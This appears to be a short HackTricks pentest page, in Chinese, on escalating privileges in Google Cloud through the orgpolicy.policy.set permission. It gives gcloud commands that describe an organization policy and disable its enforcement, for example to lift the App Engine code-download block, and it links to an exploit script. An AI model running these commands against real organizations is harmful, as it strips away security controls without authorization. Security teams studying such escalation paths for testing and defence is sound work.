# GCP - Orgpolicy Privesc

{{#include ../../../banners/hacktricks-training.md}}

## orgpolicy

### `orgpolicy.policy.set`

利用 **orgpolicy.policy.set** 的攻击者可以操纵组织政策，这将允许他移除某些限制，从而阻碍特定操作。例如，约束 **appengine.disableCodeDownload** 通常会阻止下载 App Engine 源代码。然而，通过使用 **orgpolicy.policy.set**，攻击者可以停用此约束，从而获得下载源代码的权限，尽管它最初是受到保护的。
```bash
# Get info
gcloud resource-manager org-policies describe <org-policy> [--folder <id> | --organization <id> | --project <id>]

# Disable
gcloud resource-manager org-policies disable-enforce <org-policy> [--folder <id> | --organization <id> | --project <id>]
```
一个用于此方法的python脚本可以在[这里](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/orgpolicy.policy.set.py)找到。

## 参考文献

- [https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/](https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/)

{{#include ../../../banners/hacktricks-training.md}}
